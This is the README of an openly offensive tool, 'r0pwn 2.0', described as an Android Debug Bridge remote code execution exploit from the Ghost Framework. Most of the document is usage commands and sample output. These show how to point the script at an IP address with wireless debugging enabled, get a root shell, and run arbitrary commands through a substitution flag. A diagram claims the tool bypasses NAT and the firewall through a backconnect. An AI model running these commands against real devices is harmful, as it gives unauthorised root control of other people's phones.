# r0pwn 2.0

*hmm... r0pwn means robot pwn?*

    Android Debug Bridge RCE exploit.

## Table of contents

* [Official Release](#release)
* [Dependencies](#dependencies)
* [Exploiting](#exploiting)
* [Code Substitution](#substitution)
* [Exploit Algorithm](#algorithm)
* [Exploit Credits](#credits)

## Release

This is a repo of an exploit, but this exploit is a part of the Ghost Framework developed by @entynetproject.

[Ghost Framework](https://github.com/entynetproject/ghost)

## Dependencies

* `android-platform-tools`

## Exploiting

```shell
python3 exploit.py <target>
```

**NOTE:** Target should have wireless debugging turned on

```shell
root@kali:~/r0pwn# python3 exploit.py 192.168.1.75

======================
r0pwn by Ivan Nikolsky
======================

Android Debug Bridge RCE exploit.

exploiting 192.168.1.75...
root@nevada:~# whoami
root
root@nevada:~#
```

## Substitution

```shell
root@kali:~/r0pwn# python3 exploit.py <target> -s <code>
```

**NOTE:** Angry substitution will not work without SUID/root!

```shell
root@kali:~/r0pwn# python3 exploit.py 192.168.1.75 -s whoami

======================
r0pwn by Ivan Nikolsky
======================

Android Debug Bridge RCE exploit.

exploiting 192.168.1.75...
substituting whoami...
executing whoami...
root
```

## Algorithm

```
                    backconnect (over ADB)
               +------------------------------+
               |                              |
attacker --- r0pwn --- NAT -+- Firewall -+- target
                            |            |
                            +------------+
                                bypass
```

## Credits

**Authors:**

* Ivan Nikolsky (@enty8080) - `research` and `development`.

**Special Thanks:**

* [PhoneSploit](https://github.com/metachar/PhoneSploit) - thanks for `inspiration`.
